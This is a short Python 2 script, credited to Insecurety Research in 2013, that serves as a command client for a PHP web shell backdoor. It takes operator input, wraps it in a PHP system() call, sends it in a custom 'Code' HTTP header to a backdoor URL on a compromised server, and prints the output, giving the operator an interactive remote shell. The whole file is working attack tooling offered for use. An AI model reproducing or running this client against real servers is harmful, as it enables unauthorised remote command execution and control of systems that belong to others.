#!/usr/bin/python
# Client for the backdoor which
# uses HTTP CODE header for inserting code
# Got the idea after seeing this sort of payload
# dropped by a phpmyadmin exploit on rdot :)
# Is also good to learn how to use urllib
# and not be lazy arse with requests all of time!
# Insecurety Research (2013) - insecurety.net
import urllib2
import sys

def usage(program):
    print "HTTP CODE Header Backdoor Command Shell"
    print "Usage: %s <Backdoor URL>" %(program)
    print "Example: %s http://www.test.com/webshell.php" %(program)
    sys.exit(0)

def main(args):
    try:
        if len(args) < 2:
            usage(args[0])

        print "[+] Using %s as target" %(args[1])
        print "[!] Popping a shell, type 'exit' to quit"
        while True:
            opener = urllib2.build_opener()
            url = args[1]
            cmd = raw_input('~$ ')
            if cmd == "exit":
                sys.exit(0)
            else:
                code = "system('%s');" %(cmd)
                opener.addheaders.append(('Code', code))# %(str(code))
                urllib2.install_opener(opener)
                result = urllib2.urlopen(url).read()
                print result
    except Exception, e:
        print e

if __name__ == "__main__": 
    main(sys.argv)
